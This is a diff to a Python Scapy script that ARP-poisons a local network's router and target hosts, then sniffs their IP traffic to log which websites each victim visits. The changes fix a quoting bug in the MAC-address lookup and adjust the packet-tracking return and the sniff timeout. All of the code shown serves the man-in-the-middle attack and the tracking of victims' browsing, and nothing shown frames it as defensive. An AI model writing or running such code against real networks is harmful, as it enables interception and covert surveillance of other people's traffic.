@@ -61,7 +61,7 @@ class PreAttack(object):
 		self.target = target
 		self.interface = interface
 	def get_MAC_Addr(self):
-		return srp(Ether(dst="ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target.IP),timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc
+		return srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.target.IP),timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc
 
 class Attack(object):
 	def __init__(self, routerip, routermac, targets, interface):
@@ -105,8 +105,8 @@ class PostAttack():
 			if self.targets[i].get_IP == dest:
 				self.targets[i].visit(socket.gethostbyaddr(src))
 				return
-	
-		return track_packet
+		return
+				 
 	def make_Graphs():
 		allWebsites = {}
 		for i in range(0, len(self.targets)):
@@ -149,7 +149,7 @@ if __name__ == '__main__':
 			try:
 				Attacks(IP_router.src, MAC_router, targets, interface).send_Poison(my_Mac_Addr)
 				#sleep(3)
-				sniff(filter="ip", prn=PostAttack(targets).track_packet, count=10)
+				sniff(filter="ip", prn=PostAttack(targets).track_packet, timeout=3)
 			except Exception:
 				print("[Failed to send ARP-Poison]")
 	except KeyboardInterrupt:
